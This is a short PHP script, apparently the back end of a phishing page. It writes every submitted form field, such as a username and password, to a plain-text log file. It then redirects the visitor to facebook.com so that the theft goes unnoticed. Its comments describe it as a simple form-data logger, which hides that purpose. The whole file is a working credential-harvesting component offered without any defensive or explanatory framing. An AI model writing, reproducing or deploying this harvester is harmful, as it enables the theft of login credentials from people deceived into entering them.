<?php
// Set the location to redirect the page
header('Location: http://www.facebook.com');

// Open the text file in writing mode
$file = fopen("log.txt", "a");

// Start HTML output
$html = "<html><head><title>Submitted Form Data</title></head><body>";

$html .= "<h2>Submitted Form Data:</h2>";
$html .= "<ul>";

foreach ($_POST as $variable => $value) {
    // Escape HTML entities to prevent XSS attacks
    $variable = htmlspecialchars($variable, ENT_QUOTES, 'UTF-8');
    $value = htmlspecialchars($value, ENT_QUOTES, 'UTF-8');
    $html .= "<li><strong>$variable:</strong> $value</li>";
    // Write to log file
    fwrite($file, "$variable=$value\r\n");
}

$html .= "</ul>";

// Close HTML output
$html .= "</body></html>";

// Write HTML output to file
fwrite($file, $html . "\r\n\r\n");

// Close the file
fclose($file);

// Output the HTML
echo $html;

// Exit script
exit;
?>
